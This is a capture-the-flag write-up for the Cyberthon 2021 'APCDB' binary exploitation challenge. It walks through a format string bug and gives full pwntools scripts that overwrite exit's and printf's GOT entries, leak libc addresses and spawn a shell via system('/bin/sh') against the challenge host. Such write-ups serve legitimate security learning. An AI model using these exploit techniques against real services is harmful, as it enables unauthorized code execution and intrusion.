---
title: Cyberthon 2021 - APCDB (pwn)
date: 2021-05-19T05:59:12Z
draft: false
description: format string exploitation, ret2libc
tocOpen: true
---

> We've found a network service that seems to be posing as a fake directory of APOCALYPSE members. Although it doesn't seem to be hooked up to any actual database, it does look a tad vulnerable. Could u try to break in anyway? Who knows, access to this server might come in useful.
>
> Interact with the service at: aiodmb3uswokssp2pp7eum8qwcsdf52r.ctf.sg:30201
>
> Note: once you get a shell, the flag.txt can be found in the user's home directory.
>
> Attached : [apcdb.zip](attachments/apcdb.zip)

## Overview

```c
{
  char format[264]; // [rsp+0h] [rbp-110h] BYREF
  unsigned __int64 v4; // [rsp+108h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  setup_IO(argc, argv, envp);
  banner();
  printf("[+] Contact Lookup: ");
  __isoc99_scanf("%255s", format);
  puts(s);
  printf("[+] Looking up contact for ");
  printf(format);
  puts("...");
  puts("[-] Sorry, no such member!");
  exit(0);
}
```

Let's break down what the program is doing here:

1. It prints a **banner()**
2. It scans in **%255s** worth of input into `format[264]`. _no bof :(_
3. It **printf(format)** _aka our input_ which gives us a format string vulnerability.
4. It then exits the program.

<br><br>

## Exploitation Ideas

It is apparent that we have to use the format string exploit in order to win, as it is the only exploit available to us.

However, there is no function that prints the flag or grants us a shell. System function is also **not imported** in this binary.

Hence it becomes apparent that we have to call system with a **ret2libc** attack.

Hence the idea is as such:

1. We have to first loop the program back so that our program doesnt just simply close after one loop.
2. We have to leak the LIBC of the functions so we are able to find the LIBC used and obtain our offset.
3. Find an ideal function to overwrite such that we can execute `system('/bin/sh')` and obtain a shell. _the only function that seems usable is printf_

Let's get started.

<br><br>

## Exploitation

Our first objective is to loop the program back continuously. This can be done by overwriting **GOT entry for exit() to the address of main**.

This is so that everytime the program tries to exit, it goes back to main instead.

Since PIE is not enabled, our GOT addresses will remain constant so we can easily find the addresses we need, made even easier with pwntools.

```py
from pwn import *
p = remote('aiodmb3uswokssp2pp7eum8qwcsdf52r.ctf.sg', 30201)

context.binary = elf = ELF('apcdb')
exit = elf.got.exit
main = elf.sym.main

log.info(f"Main: {hex(main)}")
log.info(f"Exit: {hex(exit)}")

p.sendline(fmtstr_payload(6, {exit:main}))
p.interactive()
'''
[*] '/media/sf_dabian/Challenges/Cyberthon/Pwn/abcdb/apcdb'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x3ff000)

 ] Exit: 0x601040
'''
```

Next, we find the offset of our input with a simple payload ```AAAAAAAA.%p.%p.%p.%p.%p.%p```.

![image](attachments/image1.png)

As you can see, our input offset is just nice on the 6th format string. Hence our offset is 6.

With that, we have everything we need to leak our global offset table values.

Initially, I tried sending `p.sendline(p64(elf.got.printf) + b'%6$s')` to the program. However it did not yield me my expected leak.

This is because the scanf only reads up till the null terminator. Consider this:

![image](attachments/image2.png)

Anyways, this means that we will have to put our format string at the start and our leak behind.

```py
from pwn import *
p = remote('aiodmb3uswokssp2pp7eum8qwcsdf52r.ctf.sg', 30201)
context.binary = elf = ELF('apcdb')

exit = elf.got.exit
main = elf.sym.main

log.info(f"Main: {hex(main)}")
log.info(f"Exit: {hex(exit)}")

p.sendline(fmtstr_payload(6, {exit:main}))

payload = b'%7$sAAAA' + p64(elf.got.printf)                              # since its a 64bit binary, data is stored in 8 bytes. %7$s is 4 bytes, and AAAA is appended to make it 8 so that the format string directly references the leak and not some random bytes
p.clean()
p.sendline(payload)

p.recvuntil("contact for ")
printf = u64(p.recvline().rstrip(b'AAAA(\x10`...\n').ljust(8, b'\x00'))

payload = b'%7$sAAAA' + p64(elf.got.puts)                              # since its a 64bit binary, data is stored in 8 bytes. %7$s is 4 bytes, and AAAA is appended to make it 8 so that the format string directly references the leak and not some random bytes
p.clean()
p.sendline(payload)

p.recvuntil("contact for ")
puts = u64(p.recvline().rstrip(b'AAAA\x18\x10`...\n').ljust(8, b'\x00'))

log.info(f"Printf is {hex(printf)}")
log.info(f"Puts is {hex(puts)}")


p.interactive()

'''
[*] Printf is 0x7f4b82cb6f70
[*] Puts is 0x7f4b82cd2aa0
'''
```

By looking up the addresses of printf and puts in blukat, we find our libc.

![image](attachments/image3.png)

We can now calculate the libc base by using our leak to minus the libc symbol.

With the libc base, we can find libc symbol for system, thus allowing us to overwrite **printf GOT entry with libc system**.

Thus the next time we send **/bin/sh\x00** as our input, it will be executed by system rather than printf and we get a shell.

```py
from pwn import *
p = remote('aiodmb3uswokssp2pp7eum8qwcsdf52r.ctf.sg', 30201)
context.binary = elf = ELF('apcdb')
libc = ELF('libc6_2.27-3ubuntu1.4_amd64.so')

exit = elf.got.exit
main = elf.sym.main

log.info(f"Main: {hex(main)}")
log.info(f"Exit: {hex(exit)}")

p.sendline(fmtstr_payload(6, {exit:main}))

payload = b'%7$sAAAA' + p64(elf.got.printf)                              # since its a 64bit binary, data is stored in 8 bytes. %7$s is 4 bytes, and AAAA is appended to make it 8 so that the format string directly references the leak and not some random bytes
p.clean()
p.sendline(payload)

p.recvuntil("contact for ")
printf = u64(p.recvline().rstrip(b'AAAA(\x10`...\n').ljust(8, b'\x00'))

payload = b'%7$sAAAA' + p64(elf.got.puts)                              # since its a 64bit binary, data is stored in 8 bytes. %7$s is 4 bytes, and AAAA is appended to make it 8 so that the format string directly references the leak and not some random bytes
p.clean()
p.sendline(payload)

p.recvuntil("contact for ")
puts = u64(p.recvline().rstrip(b'AAAA\x18\x10`...\n').ljust(8, b'\x00'))

log.info(f"Printf is {hex(printf)}")
log.info(f"Puts is {hex(puts)}")

libc.address = printf - libc.sym.printf

p.sendline(fmtstr_payload(6, {elf.got.printf: libc.sym.system}))

p.sendline('/bin/sh\x00')
p.clean()
p.sendline('cat */*/flag*')
print(p.recvline())
```

<br><br>

**Cyberthon{f4k3_c0nt4ct5_f41lur3}**
